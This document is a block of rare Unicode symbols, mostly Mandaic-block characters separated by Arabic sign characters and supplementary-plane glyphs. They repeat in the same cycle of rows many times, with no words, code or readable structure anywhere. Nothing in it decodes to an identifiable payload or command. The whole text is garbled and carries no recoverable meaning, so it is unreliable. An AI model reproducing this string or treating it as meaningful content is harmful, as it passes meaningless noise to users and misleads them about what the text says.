࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙